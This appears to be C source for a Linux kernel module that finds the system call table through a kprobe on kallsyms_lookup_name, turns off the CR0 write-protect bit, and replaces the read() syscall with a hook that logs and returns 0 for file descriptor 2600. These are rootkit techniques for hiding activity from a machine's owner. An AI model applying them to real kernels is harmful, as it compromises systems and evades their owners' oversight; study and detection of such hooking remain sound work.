#include <linux/unistd.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kprobes.h>
#include <linux/string.h>

#include <asm/special_insns.h>
#include <uapi/asm/processor-flags.h>

#include "hooking.h"

// Function pointer for read
typedef int (*sysfun_t)(struct pt_regs *);
sysfun_t old_read;

// Function pointer for kallsyms_lookup_name
typedef void *(*kallsyms_t)(const char*);
kallsyms_t lookup_name;

// Pointer to syscall table 
unsigned long *syscall_table = 0;

// cr0 status
unsigned long cr0;

int new_read(struct pt_regs *regs) {
    int fd = (int) regs->di;
    void *buf = (void *)regs->si;
    size_t count = (size_t)regs->dx;
    
    int retval;
    if (fd == 2600) {
        printk(KERN_INFO "Read was called with file descriptor 2600, doing something else.");
        printk(KERN_INFO "Something else");
        return 0;
    }

    retval = old_read(regs);
    
    return retval;
}

void cr0_write(unsigned long val) {
    asm volatile("mov %0,%%cr0"
    : "+r"(val)
    :
    : "memory");
}

unsigned long unprotect_memory(void) {
    unsigned long cr0;
    unsigned long newcr0;

    cr0 = native_read_cr0();
    newcr0 = cr0 & ~(X86_CR0_WP);
    cr0_write(newcr0);
    return cr0;
}

void protect_memory(unsigned long val) {
    cr0_write(val);
}

void get_kallsyms_funcptr(void) {
    // declare what we need to find
    struct kprobe probe = {
        .symbol_name = "kallsyms_lookup_name"
    };
    
    if (register_kprobe(&probe)) {
        printk(KERN_ERR "Huge fuck up, couldn't find kallsyms blah blah");
    }
    
    lookup_name = (kallsyms_t) (probe.addr);
    unregister_kprobe(&probe);

    printk(KERN_INFO "kallsyms_lookup_name @ %p\n", lookup_name);

}

void get_syscall_table(void) {
    syscall_table = (long unsigned int *) lookup_name("sys_call_table");
    if (!syscall_table) {
        printk(KERN_ERR "Couldn't find syscall table");
        return;
    }
    printk(KERN_INFO "Found syscall table @ %p", syscall_table);
}

void hijack_read(void) {
    unsigned long old_cr0 = unprotect_memory();
    
    old_read = (sysfun_t) syscall_table[__NR_read];
    printk(KERN_INFO "Old read @ %p", old_read);
    
    syscall_table[__NR_read] = (uint64_t) new_read;
    printk(KERN_INFO "Hooked read(), new read @ %p", &syscall_table[__NR_read]);
    protect_memory(old_cr0);
}
